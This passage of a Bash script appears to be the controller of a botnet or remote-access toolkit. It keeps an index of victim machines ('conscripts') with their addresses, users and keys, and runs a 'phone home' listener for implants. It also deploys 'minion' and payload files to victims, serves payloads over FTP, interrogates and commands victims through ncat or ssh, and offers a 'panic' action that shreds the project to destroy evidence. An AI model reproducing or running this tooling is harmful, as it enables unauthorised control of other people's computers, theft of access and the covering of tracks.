            echo "[ ERROR ]: Could not create anchor file!"\
                "($MINION_CALL_LISTENER_ANCHOR)"
            return 1
        else
            echo "[ OK ]: File exists! ($MINION_CALL_LISTENER_ANCHOR)"
        fi
    fi
    local FORMATTED_ARGS="`format_start_minion_call_listener_cargo_args`"
    while :
    do
        if [ ! -f "$MINION_CALL_LISTENER_ANCHOR" ]; then
            echo "[ INFO ]: Anchor file not found. Terminating!"
            break
        fi
        echo "[ INFO ]: Listening for incomming transmission..."
        local MINION_CALL="`$RAW_LISTENER_CARGO $FORMATTED_ARGS`"
        if [ ! -f "$MINION_CALL_LISTENER_ANCHOR" ]; then
            echo "[ INFO ]: Anchor file not found. Terminating!"
            break
        fi
        echo "[ INFO ]: Minion transmission - ($MINION_CALL)"
        process_minion_phone_home_call "$MINION_CALL"
    done
    echo "[ DONE ]: Terminating minion phone home listener!"
    return $?
}

function stop_minion_call_listener () {
    if [ -f "$MINION_CALL_LISTENER_ANCHOR" ]; then
        rm -f "$MINION_CALL_LISTENER_ANCHOR"i &> /dev/null
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not remove minion call listener anchor file!"\
                "(${MINION_CALL_LISTENER_ANCHOR})"
        else
            echo "[ OK ]: Minion call listener anchor file removed!"
        fi
    else
        echo "[ WARNING ]: No minion call listener anchor file found!"
    fi
    local FORMATTED_ARGS="`format_stop_minion_call_listener_cargo_args`"
    "$RAW_TRANSCEIVER_CARGO" $FORMATTED_ARGS
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Failed to send termination signal to minion call listener!"
    else
        echo "[ OK ]: Sent termination signal to minion call listener!"
    fi
    return $EXIT_CODE
}

function register_conscript () {
    local CONSCRIPT_ID="${1:-${VICTIM_IDENTIFIERS[0]}}"
    local CONSCRIPT_ADDR="${2:-${VICTIM_ADDRESSES[0]}}"
    local CONSCRIPT_GROUP="${3:-${GROUP_LABELS[0]}}"
    local CONSCRIPT_PORT="${4:-$PORT_NUMBER}"
    local CONSCRIPT_PROTOCOL="${5:-$PROTOCOL}"
    local CONSCRIPT_USER="${6:-$VICTIM_USER}"
    local CONSCRIPT_KEY="${7:-$VICTIM_KEY}"
    local CONSCRIPT_RECORD="${CONSCRIPT_ID},${CONSCRIPT_ADDR},${CONSCRIPT_PORT},${CONSCRIPT_PROTOCOL},${CONSCRIPT_USER},${CONSCRIPT_KEY},${CONSCRIPT_LABEL}"
    check_conscript_registered "$CONSCRIPT_ID"
    if [ $? -eq 0 ]; then
        warning_msg "Conscript ID already registered!"\
            "(${RED}$CONSCRIPT__RECORD${RESET})"
        return 1
    fi
    echo "$CONSCRIPT_RECORD" >> "$CONSCRIPT_INDEX"
    if [ ! -z "$GROUP_LABEL" ]; then
        add_conscripts_to_group "$GROUP_LABEL" "$CONSCRIPT_RECORD"
        return $?
    fi
    return 0
}

function remove_conscript_from_group () {
    local CONSCRIPT_ID="$1"
    local GROUP_LBL="$2"
    local GDIR_PATH="${GROUP_DIR}/${GROUP_LBL}"
    local CFILE_PATH="${GDIR_PATH}/${CONSCRIPT_ID}.dtls"
    rm -f "$CFILE_PATH" &> /dev/null
    if [ $? -ne 0 ]; then
        echo "[ ERROR ]: Failed to remove conscript group membership!"
        return 1
    fi
    local GRECORD=`awk -F, -v group_label="$GROUP_LBL" \
        'BEGIN { OFS="," } $1 !~ "#" && $1 == group_label { print $1, $2 - 1 }' "$GROUP_INDEX"`
    if [ $? -ne 0 ] || [ -z "$GRECORD" ]; then
        echo "[ ERROR ]: Group ($GROUP_LBL) not found!"
        return 2
    fi
    local LINE_NO=`awk -F, -v group_label="$GROUP_LBL" \
        '$1 !~ "#" && $1 == group_label { print NR; exit }' "$GROUP_INDEX"`
    local SED_CMD="${LINE_NO}s/.*/${GRECORD}/"
    sed -i "$SED_CMD" "$GROUP_INDEX" &> /dev/null
    if [ $? -ne 0 ]; then
        echo "[ ERROR ]: Failed to update conscript group index!"
        return 3
    fi
    local CRECORD=`awk -F, -v conscript_id="$CONSCRIPT_ID" \
        'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $1, $2, $3, $4, $5, $6 }' \
        "$CONSCRIPT_INDEX"`
    if [ $? -ne 0 ] || [ -z "$CRECORD" ]; then
        echo "[ ERROR ]: Conscript ($CONSCRIPT_ID) not found!"
        return 4
    fi
    local LINE_NO=`awk -F, -v conscript_id="$CONSCRIPT_ID" \
        '$1 !~ "#" && $1 == conscript_id { print NR; exit }' \
        "$CONSCRIPT_INDEX"`
    local SED_CMD=`echo "${LINE_NO}s/.*/${CRECORD}" | awk '{print $0 "/"; exit}'`
    sed -i "$SED_CMD" "$CONSCRIPT_INDEX" &> /dev/null
    return 0
}

function add_conscripts_to_archive () {
    local ADD_TO="$1"
    local RECORDS=( ${@:2} )
    for conscript_record in ${RECORDS[@]}; do
        local MODDED_RECORD=`echo "$conscript_record" | \
            awk -F, -v archive_label="$ADD_TO" 'BEGIN { OFS="," }
            { print $1, $2, $3, $4, $5, $6, $7, archive_label }'`
        echo "$MODDED_RECORD" >> "$ARCHIVE_INDEX"
        local CONSCRIPT_ID=`echo "$conscript_record" | awk -F, '{ print $1 }'`

        local CRECORD=`awk -F, -v conscript_id="$CONSCRIPT_ID" \
            'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $1, $2, $3, $4, $5, $6, $7, NR }' "$CONSCRIPT_INDEX"`
        local LINE_NO=`echo "$CRECORD" | awk -F, '{ print $NF }'`
        local SED_CMD="${LINE_NO}d"
        sed -i "$SED_CMD" "$CONSCRIPT_INDEX" &> /dev/null
    done
    return 0
}

function update_group_size () {
    local GROUP_LABEL="$1"
    local GROUP_PATH="${GROUP_DIR}/${GROUP_LABEL}"
    local GROUP_SIZE=`ls -1 ${GROUP_PATH} | wc -l`
    local GRECORD=`awk -F, -v group_label="$GROUP_LABEL" \
        'BEGIN { OFS="," } $1 == group_label { print $1, $2, NR }' "$GROUP_INDEX"`
    local LINE_NO=`echo "$GRECORD" | awk -F, '{ print $NF }'`
    local MODDED_GRECORD=`echo "$GRECORD" | awk -F, -v group_size="$GROUP_SIZE" \
        'BEGIN { OFS="," } { print $1, group_size }'`
    local SED_CMD="${LINE_NO}s/.*/${MODDED_GRECORD}/"
    sed -i "$SED_CMD" "$GROUP_INDEX" &> /dev/null
    return $?
}

function add_conscripts_to_group () {
    local ADD_TO="$1"
    local RECORDS=( ${@:2} )
    local GDIR_PATH="${GROUP_DIR}/${ADD_TO}"
    if [ ! -d "$GDIR_PATH" ]; then
        echo "[ WARNING ]: Conscript group ($ADD_TO) not found! Building..."
        action_create_group "$ADD_TO"
        if [ $? -ne 0 ]; then
            echo "[ ERROR ]: Build failure!"\
                "Could not create conscript group ($ADD_TO)!"
            return 1
        fi
    fi
    for conscript_record in ${RECORDS[@]}; do
        local MODDED_RECORD=`echo "$conscript_record" | \
            awk -F, -v group_label="$ADD_TO" 'BEGIN { OFS="," }
            { print $1, $2, $3, $4, $5, $6, group_label }'`
        local CONSCRIPT_ID=`echo "$conscript_record" | awk -F, '{ print $1 }'`
        local CFILE_PATH="${GDIR_PATH}/${CONSCRIPT_ID}.dtls"
        echo "$MODDED_RECORD" > "$CFILE_PATH"
        local CRECORD=`awk -F, -v conscript_id="$CONSCRIPT_ID" \
            'BEGIN { OFS="," } $1 !~ "#" && $1 == conscript_id { print $1, $2, $3, $4, $5, $6, $7, NR }' "$CONSCRIPT_INDEX"`
        local LINE_NO=`echo "$CRECORD" | awk -F, '{ print $NF }'`
        local SED_CMD="${LINE_NO}s/.*/${MODDED_RECORD}/"
        sed -i "$SED_CMD" "$CONSCRIPT_INDEX" &> /dev/null
    done
    update_group_size "$ADD_TO"
    return 0
}

function remove_line_from_file () {
    local LINE_NO=$1
    local FILE_PATH="$2"
    if [ ! -f "$FILE_PATH" ]; then
        echo "[ WARNING ]: File not found! (${FILE_PATH})"
        return 1
    fi
    if [ ! $LINE_NO -eq $LINE_NO &> /dev/null ]; then
        echo "[ WARNING ]: Invalid line number! Number required, not (${LINE_NO})."
        return 2
    fi
    sed -i -e "${LINE_NO}d" "$FILE_PATH" &> /dev/null
    return $?
}

function generate_interogation_report () {
    local RECORD="$1"
    local INTEROGATION="${@:2}"
    local REPORT_TIMESTAMP=`date +'%d.%m.%Y-%H.%M.%S'`
    local REPORT_FL="${REPORT_DIR}/${REPORT_TIMESTAMP}-interogation.report"
    echo "-- START -- $RECORD --
    " > "$REPORT_FL"
    echo "$INTEROGATION" >> "$REPORT_FL"
    echo "--  END -- `date`" >> "$REPORT_FL"
    if [ ! -f "$REPORT_FL" ]; then
        return 1
    fi
    return 0
}

function shred_directory () {
    local TARGET_DIR="$1"
    find "$TARGET_DIR" -type f | xargs shred f -n 10 -z -u &> /dev/null
    rm -rf "$TARGET_DIR" &> /dev/null
    return $?
}

# INTEROGATORS

function interogate_conscript_raw () {
    local RECORD="$1"
    local VCTM_INSTRUCTION="${CONSCRIPT_COMMANDS['interogate']}"
    local VCTM_ADDRESS=`echo "$RECORD" | awk '{print $2}'`
    local VCTM_PORT=`echo "$RECORD" | awk '{print $3}'`
    local INTEROGATION=`echo "$INSTRUCTION" | ncat -w $CNX_TIMEOUT "$VCTM_ADDRESS" $VCTM_PORT`
    echo "$INTEROGATION"
    return $?
}

function interogate_conscript_ssh () {
    local RECORD="$1"
    local VCTM_INSTRUCTION="${CONSCRIPT_COMMANDS['interogate']}"
    local VCTM_ADDRESS=`echo "$RECORD" | awk -F, '{print $2}'`
    local VCTM_PORT=`echo "$RECORD" | awk -F, '{print $3}'`
    local VCTM_USER=`echo "$RECORD" | awk -F, '{print $5}'`
    if [ -f "${VICTIM_KEY}" ]; then
        local INTEROGATION=`ssh -p $VCTM_PORT "${VCTM_USER}@${VCTM_ADDRESS}" \
            "$VCTM_INSTRUCTION" 2> /dev/null`
    else
        local INTEROGATION=`$SSH_COMMAND_CARGO "$VCTM_USER" "$VCTM_ADDRESS" "$VCTM_PORT" \
            "$VICTIM_KEY" "$VCTM_INSTRUCTION" 2> /dev/null`
    fi
    echo "$INTEROGATION"
    return $?
}

function interogate_conscript () {
    local RECORD="$1"
    case "$PROTOCOL" in
        'ssh')
            interogate_conscript_ssh "$RECORD"
            ;;
        'raw')
            interogate_conscript_raw "$RECORD"
            ;;
    esac
    return $?
}

function interogate_all_conscripts_for_updates () {
    local CONSCRIPT_RECORDS=( `fetch_registered_conscript_records` )
    local FAILED_TO_INTEROGATE=()
    local INTEROGATION_SUCCESS=()
    for conscript_record in ${CONSCRIPT_RECORDS[@]}; do
        local INTEROGATION=`interogate_conscript "$conscript_record"`
        if [ $? -ne 0 ]; then
            local FAILED_TO_INTEROGATE=(
                ${FAILED_TO_INTEROGATE[@]} "$conscript_record"
            )
        else
            local INTEROGATION_SUCCESS=(
                ${INTEROGATION_SUCCESS[@]} "$conscript_record"
            )
        fi
        echo "-- RECORD -- $conscript_record --
        "
        echo "$INTEROGATION
        "
        echo "-- END -- `date` --
        "
        if [[ "$PAPER_TRAIL_FLAG" == 'on' ]]; then
            generate_interogation_report "$conscript_record" "$INTEROGATION"
        fi
    done
    if [ ${#FAILED_TO_INTEROGATE[@]} -ne 0 ]; then
        if [ ${#INTEROGATION_SUCCESS[@]} -eq 0 ]; then
            return 1
        fi
    fi
    return 0
}

function interogate_specific_conscripts_for_updates () {
    local FAILED_TO_INTEROGATE=()
    local INTEROGATION_SUCCESS=()
    for conscript_addr in ${VICTIM_ADDRESSES[@]}; do
        local VCTM_ID=`awk -F, -v ipv4_addr="$conscript_addr" \
            '$2 == ipv4_addr {print $1}' "${CONSCRIPT_INDEX}"`
        local MOCK_RECORD="${VCTM_ID},${conscript_addr},${PORT_NUMBER},${PROTOCOL},${VICTIM_USER},${VICTIM_KEY},"
        local INTEROGATION=`interogate_conscript "$MOCK_RECORD"`
        if [ $? -ne 0 ]; then
            local FAILED_TO_INTEROGATE=(
                ${FAILED_TO_INTEROGATE[@]} "$conscript_record"
            )
        else
            local INTEROGATION_SUCCESS=(
                ${INTEROGATION_SUCCESS[@]} "$conscript_record"
            )
        fi
        echo "-- RECORD -- $VCTM_ID | $conscript_addr --
        "
        echo "$INTEROGATION
        "
        echo "-- END -- `date` --
        "
        if [[ "$PAPER_TRAIL_FLAG" == 'on' ]]; then
            generate_interogation_report "$conscript_record" "$INTEROGATION"
        fi
    done
    if [ ${#FAILED_TO_INTEROGATE[@]} -ne 0 ]; then
        if [ ${#INTEROGATION_SUCCESS[@]} -eq 0 ]; then
            return 1
        fi
    fi
    return 0
}

function interogate_grouped_conscripts_for_updates () {
    local GROUP_LBL=${GROUP_LABELS[0]}
    local MEMBERSHIP_RECORDS=( `fetch_group_membership_records "$GROUP_LBL"` )
    local FAILED_TO_INTEROGATE=()
    local INTEROGATION_SUCCESS=()
    for conscript_record in ${MEMBERSHIP_RECORDS[@]}; do
        local INTEROGATION=`interogate_conscript "$conscript_record"`
        if [ $? -ne 0 ]; then
            local FAILED_TO_INTEROGATE=(
                ${FAILED_TO_INTEROGATE[@]} "$conscript_record"
            )
        else
            local INTEROGATION_SUCCESS=(
                ${INTEROGATION_SUCCESS[@]} "$conscript_record"
            )
        fi
        echo "-- RECORD -- $conscript_record --
        "
        echo "$INTEROGATION
        "
        echo "-- END -- `date` --
        "
        if [[ "$PAPER_TRAIL_FLAG" == 'on' ]]; then
            generate_interogation_report "$conscript_record" "$INTEROGATION"
        fi
    done
    if [ ${#FAILED_TO_INTEROGATE[@]} -ne 0 ]; then
        if [ ${#INTEROGATION_SUCCESS[@]} -eq 0 ]; then
            return 1
        fi
    fi
    return 0
}

# PROCESSORS

function process_action () {
    local ACTION_LABEL="$1"
    case "$ACTION_LABEL" in
        'start-minion-listener')
            action_start_minion_call_listener
            ;;
        'stop-minion-listener')
            action_stop_minion_call_listener
            ;;
        'deploy-minion')
            action_deploy_minion
            ;;
        'deploy-payload')
            action_deploy_payload
            ;;
        'register-conscript')
            action_register_conscript
            ;;
        'group-conscripts')
            action_group_conscripts
            ;;
        'archive-conscripts')
            action_archive_conscripts
            ;;
        'panic')
            action_panic
            ;;
        'interogate-conscripts')
            action_interogate_conscripts_for_updates
            ;;
        'search-conscripts')
            action_search_conscripts
            ;;
        'mission-instruction')
            action_issue_conscript_mission_instruction
            ;;
        'delete-archive')
            action_delete_archive
            ;;
        'delete-group')
            action_delete_group
            ;;
        'create-group')
            action_create_group "${GROUP_LABELS[0]}"
            ;;
        'search-groups')
            action_search_groups
            ;;
        'search-archives')
            action_search_archives
            ;;
        'rebase-conscripts')
            action_rebase_conscripts
            ;;
        'setup-ftp')
            action_setup_ftp_server
            ;;
        'conscript-commander')
            action_command_conscript
            ;;
        *)
            error_invalid_action "$ACTION_LABEL"
            ;;
    esac
    return $?
}

# HANDLERS

function handle_action_shred_directory () {
    local TARGET_DIR="$1"
    if [ ! -d "$TARGET_DIR" ]; then
        echo "[ ERROR ]: Invalid directory path ($TARGET_DIR)."
        return 1
    fi
    shred_directory "$TARGET_DIR"
    if [ -d "$TARGET_DIR" ]; then
        echo "[ NOK ]: Something went wrong."\
            "Could not shred directory ($TARGET_DIR)."
        echo "[ INFO ]: Check user and group permissions."
        return 1
    fi
    echo "[ OK ]: Directory successfully shredded. ($TARGET_DIR)"
    return 0
}

# FORMATTERS

function format_stop_minion_call_listener_cargo_args () {
    local CARGO_ARGS=(
        "--target-address=${VICTIM_ADDRESSES[0]}"
        "--port-number=${PORT_NUMBER}"
        "--message=Terminate"
        "--silent"
    )
    echo "${CARGO_ARGS[@]}"
    return $?
}

function format_start_minion_call_listener_cargo_args () {
    local CARGO_ARGS=(
        "--port-number=${PORT_NUMBER}"
        "--target=file"
        "--iterations=1"
        "--output-file=${MINION_CALL_LISTENER_LOG}"
        "--silent"
    )
    echo "${CARGO_ARGS[@]}"
    return $?
}

# ACTIONS

function action_panic () {
    find "$PROJECT_ROOT" -type -f | xargs shred f -n 10 -z -u &> /dev/null
    rm -rf "$PROJECT_ROOT" &> /dev/null
    return $?
}

function action_command_conscript_manually () {
    local CRECORD="$1"
    local CONSCRIPT_ID="`echo $CRECORD | awk -F, '{print $1}'`"
    trap_conscript_commander
    echo -n "[ INFO ]: Opening interactive conscript shell!"\
        "Press <Ctrl-D> to exit.
    ___________________________________________________________________________

                                Conscript Reporting!
    ($CRECORD)
    ___________________________________________________________________________
                                           Yuri Time - (`date +%D-%T`)"

    if [[ "$PROTOCOL" == 'raw' ]]; then
        echo -n "${CONSCRIPT_ID}> "
    fi
    open_interactive_conscript_shell "$CRECORD"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Could not open interactive conscript shell! ($CRECORD)"
    else
        echo "[ OK ]: Successfully opened interactive conscript shell! ($CRECORD)"
    fi
    return $EXIT_CODE
}

function action_command_conscript () {
    local CONSCRIPT_ID="${VICTIM_IDENTIFIERS[0]}"
    local CRECORD=`fetch_conscript_record_by_identifier "$CONSCRIPT_ID"`
    action_command_conscript_manually "$CRECORD"
    return $?
}

function action_deploy_payload_to_victim_machine () {
    local CRECORD="$@"
    command_conscript "$CRECORD" "${CONSCRIPT_COMMANDS['payload-transfer']}"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Could not deploy hypnotik payload to conscript machine!"\
            "($CRECORD - ${CONSCRIPT_COMMANDS['minion-transfer']})"
    else
        echo "[ OK ]: Successfully deployed hypnotik payload to conscript machine!"\
            "($CRECORD)"
    fi
    return $EXIT_CODE
}

function action_deploy_minion_to_victim_machine () {
    local CRECORD="$@"
    command_conscript "$CRECORD" "${CONSCRIPT_COMMANDS['minion-transfer']}"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Could not deploy minion to conscript machine!"\
            "($CRECORD - ${CONSCRIPT_COMMANDS['minion-transfer']})"
    else
        echo "[ OK ]: Successfully deployed minion to conscript machine!"\
            "($CRECORD)"
    fi
    return $EXIT_CODE
}

function action_deploy_payload () {
    local FAILURE_COUNT=0
    local SUCCESS_COUNT=0
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        local CRECORD=`fetch_conscript_record_by_identifier "$conscript_id"`
        if [ $? -ne 0 ]; then
            echo "[ WARNING ]: Could no conscript record found! ($conscript_id)"
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
            continue
        fi
        action_deploy_payload_to_victim_machine "$CRECORD"
        if [ $? -ne 0 ]; then
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
            continue
        fi
        local SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    done
    echo "[ DONE ]: Payload deployed to ($SUCCESS_COUNT) conscript machines!"\
        "($FAILURE_COUNT) failures."
    return $FAILURE_COUNT
}

function action_deploy_minion () {
    local FAILURE_COUNT=0
    local SUCCESS_COUNT=0
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        local CRECORD=`fetch_conscript_record_by_identifier "$conscript_id"`
        action_deploy_minion_to_victim_machine "$CRECORD"
        if [ $? -ne 0 ]; then
            echo "[ WARNING ]: Could no conscript record found! ($conscript_id)"
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
            continue
        fi
        action_deploy_minion_to_victim_machine "$CRECORD"
        if [ $? -ne 0 ]; then
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
            continue
        fi
        local SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    done
    echo "[ DONE ]: Minion deployed to ($SUCCESS_COUNT) conscript machines!"\
        "($FAILURE_COUNT) failures."
    return $FAILURE_COUNT
}

function action_setup_ftp_server () {
    ensure_vsftpd_installed || return 1
    check_ftp_conf_template_file_exists || return 2
    ensure_vsftpd_public_directory || return 3
    make_payload_files_available_for_conscript_download || return 4
    start_ftp_server || return 5
    echo "[ DONE ]: FTP server setup complete!"
    return 0
}

function action_stop_minion_call_listener () {
    stop_minion_call_listener
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Could not terminate minion call listener! ($EXIT_CODE)"
    else
        echo "[ DONE ]: Minion call listener terminated!"
    fi
    return $EXIT_CODE
}

function action_start_minion_call_listener () {
    check_foreground_flag
    if [ $? -ne 0 ]; then
        start_minion_call_listener &> /dev/null &
    else
        start_minion_call_listener
    fi
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Could not start minion call listener! ($EXIT_CODE)"
    else
        echo "[ DONE ]: Minion call listener state change successful!"
    fi
    return $EXIT_CODE
}

function action_delete_archive () {
    if [ -z "$DEPRECATED_ARCHIVE" ]; then
        echo "[ WARNING ]: No archive label specified. Purging all archives!"
        echo -n > "$ARCHIVE_INDEX" &> /dev/null
        local EXIT_CODE=$?
        if [ $EXIT_CODE -ne 0 ]; then
            echo "[ NOK ]: Could not purge all conscript archives! ($ARCHIVE_INDEX)"
        else
            echo "[ OK ]: Successfully purged all conscript archives. ($ARCHIVE_INDEX)"
        fi
        echo "[ DONE ]: Conscript archive purge complete!"
        return $EXIT_CODE
    fi
    local ARCHIVE_LINES=( `awk -F, -v archive_label="$DEPRECATED_ARCHIVE" \
        '$NF == archive_label { print NR }' "$ARCHIVE_INDEX"` )
    local SED_CMD=""
    for line_no in ${ARCHIVE_LINES[@]}; do
        local SED_CMD="${SED_CMD};${line_no}d"
    done
    sed -i "$SED_CMD" "$ARCHIVE_INDEX" &> /dev/null
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ NOK ]: Could not purge archive ($DEPRECATED_ARCHIVE) records!"\
            "(${#ARCHIVE_LINES[@]}) failures. ($ARCHIVE_INDEX)"
    else
        echo "[ OK ]: Successfully purged (${#ARCHIVE_LINES[@]}) archive"\
            "records. ($ARCHIVE_INDEX)"
    fi
    echo "[ DONE ]: Conscript archive purge complete!"
    return $EXIT_CODE
}

function action_archive_conscripts () {
    if [ -z "`cat $CONSCRIPT_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    case "$TARGET" in
        'all')
            archive_all_conscripts
            ;;
        'attribute')
            archive_conscripts_by_attribute
            ;;
        'specific')
            archive_specific_conscripts
            ;;
        *)
            echo "[ ERROR ]: Invalid target ($TARGET)!"
            return 1
            ;;
    esac
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Failed to archive conscripts!"
    fi
    echo "[ DONE ]: Conscript archives complete!"
    return $EXIT_CODE
}

function action_create_group () {
    local GROUP_LABEL="$1" #"${GROUP_LABELS[@]}"
    local GROUP_PATH="${GROUP_DIR}/${GROUP_LABEL}"
    check_group_exists "$GROUP_LABEL"
    if [ $? -ne 0 ]; then
        local GRECORD="${GROUP_LABEL},0"
        echo "$GRECORD" >> "$GROUP_INDEX"
        if [ $? -ne 0 ]; then
            return 2
        fi
        ensure_directory_exists "$GROUP_PATH"
        if [ $? -ne 0 ]; then
            return 3
        fi
    else
        echo "[ WARNING ]: Group (${GROUP_LABEL}) already registered -"\
            "($GROUP_INDEX)"
        return 1
    fi
    echo "[ OK ]: Successfully created new conscript group"\
        "(${GROUP_LABEL})!"
    return 0
}

function action_rebase_conscripts () {
    local CRECORD_SET=()
    local FAILURE_COUNT=0
    local SUCCESS_COUNT=0
    for conscript_id in ${VICTIM_IDENTIFIERS[@]}; do
        local CRECORD=`fetch_conscript_record_by_identifier "$conscript_id"`
        if [ $? -ne 0 ] || [ -z "$CRECORD" ]; then
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
            echo "[ WARNING ]: Conscript ($conscript_id) record not found!"
            continue
        fi
        local CRECORD_SET=( ${CRECORD_SET[@]} "$CRECORD" )
        local SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    done
    if [ ${#CRECORD_SET[@]} -eq 0 ]; then
        echo "[ WARNING ]: No conscript records found! (${FAILURE_COUNT}) failures."
        return 1
    fi
    unlink_conscripts_from_groups ${CRECORD_SET[@]}
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ ERROR ]: Something went wrong,"\
            "could not unlink conscripts from groups!"
        return 2
    elif [ $FAILURE_COUNT -ne 0 ]; then
        echo "[ WARNING ]: Conscript rebase failures detected!"\
            "(${FAILURE_COUNT}) conscripts skipped."
    fi
    if [ $SUCCESS_COUNT -ne 0 ]; then
        echo "[ OK ]: Unlinked (${SUCCESS_COUNT}) conscripts from their groups."
    fi
    echo "[ DONE ]: Conscript rebase complete!"
    return $EXIT_CODE
}

function action_search_groups () {
    if [ -z "`cat $GROUP_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript group records found!"
        return 1
    fi
    case "$SEARCH_CRITERIA" in
        'all')
            echo "[ INFO ]: Looking up all conscript group records..."
            search_all_groups
            ;;
        'identifier')
            echo "[ INFO ]: Looking up conscript group identifier..."
            search_groups_by_identifier
            ;;
        *)
            echo "[ ERROR ]: Invalid search criteria (${SEARCH_CRITERIA})."
            return 1
            ;;
    esac
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Search failure!"
    fi
    echo "[ DONE ]: Conscript group search complete!"
    return $EXIT_CODE
}

function action_search_archives () {
    if [ -z "`cat $ARCHIVE_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No archived conscript records found!"
        return 1
    fi
    case "$SEARCH_CRITERIA" in
        'all')
            echo "[ INFO ]: Looking up all archived conscripts..."
            search_all_archived_conscripts
            ;;
        'identifier')
            echo "[ INFO ]: Looking up archived conscript identifier..."
            search_archived_conscripts_by_identifier
            ;;
        *)
            echo "[ ERROR ]: Invalid search criteria (${SEARCH_CRITERIA})."
            return 1
            ;;
    esac
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Search failure!"
    fi
    echo "[ DONE ]: Conscript archive search complete!"
    return $EXIT_CODE
}

function action_delete_group () {
    local GROUP_LABEL="${GROUP_LABELS[@]}"
    local GROUP_PATH="${GROUP_DIR}/${GROUP_LABEL}"
    if [ -z "`cat $GROUP_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript group records found!"
        return 1
    fi
    check_group_exists "$GROUP_LABEL"
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Conscript group (${GROUP_LABEL}) not found!"
        return 1
    fi
    if [ ! -d "$GROUP_PATH" ]; then
        echo "[ WARNING ]: No group directory found! ($GROUP_PATH)"
    else
        rm -rf "$GROUP_PATH" &> /dev/null
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Something went wrong."\
                "Could not remove group directory (${GROUP_PATH})."
            return 1
        fi
        echo "[ OK ]: Successfully removed group directory (${GROUP_PATH})."
    fi
    local GRECORD_LINE_NO=`awk -F, -v group_label="$GROUP_LABEL" \
        '$1 !~ "#" && $1 == group_label { print NR; exit 0 }' "$GROUP_INDEX"`
    if [ $? -ne 0 ] || [ -z "$GRECORD_LINE_NO" ]; then
        echo "[ WARNING ]: Could not find record entry in"\
            "group index! (${GROUP_INDEX})"
        return 2
    fi
    remove_line_from_file "$GRECORD_LINE_NO" "$GROUP_INDEX"
    if [ $? -ne 0 ]; then
        echo "[ NOK ]: Something went wrong."\
            "Could not remove group record entry from index!"\
            "(${GRECORD_LINE_NO}:${GROUP_INDEX})"
        return 3
    else
        echo "[ OK ]: Successfully removed group record entry from index!"
    fi
    echo "[ DONE ]: Successfully removed conscript group (${GROUP_LABEL})!"
    return 0
}

function action_group_conscripts () {
    if [ -z "`cat $CONSCRIPT_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    case "$TARGET" in
        'all')
            group_all_conscripts
            ;;
        'attribute')
            group_conscripts_by_attribute
            ;;
        'specific')
            group_specific_conscripts
            ;;
        *)
            echo "[ ERROR ]: Invalid target ($TARGET)."
            return 1
            ;;
    esac
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Failed to group conscripts."
    fi
    echo "[ DONE ]: Conscript grouping complete!"
    return $EXIT_CODE
}

function action_search_conscripts () {
    if [ -z "`cat $CONSCRIPT_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    case "$SEARCH_CRITERIA" in
        'all')
            echo "[ INFO ]: Looking up all conscript records..."
            search_all_conscripts
            ;;
        'identifier')
            echo "[ INFO ]: Looking up conscript identifier..."
            search_conscripts_by_identifier
            ;;
        'address')
            echo "[ INFO ]: Looking up conscript address..."
            search_conscripts_by_address
            ;;
        'port')
            echo "[ INFO ]: Looking up conscript port..."
            search_conscripts_by_port
            ;;
        'key')
            echo "[ INFO ]: Looking up conscript access key..."
            search_conscripts_by_key
            ;;
        'user')
            echo "[ INFO ]: Looking up conscript system user..."
            search_conscripts_by_user
            ;;
        *)
            echo "[ ERROR ]: Invalid search criteria ($SEARCH_CRITERIA)."
            return 1
            ;;
    esac
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        echo "[ WARNING ]: Search failure!"
    fi
    echo "[ DONE ]: Conscript search complete!"
    return $EXIT_CODE
}

function action_issue_conscript_mission_instruction () {
    if [ -z "`cat $CONSCRIPT_INDEX | grep -v '^#'`" ]; then
        echo "[ WARNING ]: No conscript records found!"
        return 1
    fi
    case "$TARGET" in
        'all')
            command_all_conscripts
            ;;
        'group')
            command_grouped_conscripts
            ;;
        'specific')
            command_specific_conscripts
            ;;
        *)
            echo "[ ERROR ]: Invalid target ($TARGET)."
            return 1
            ;;
    esac
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
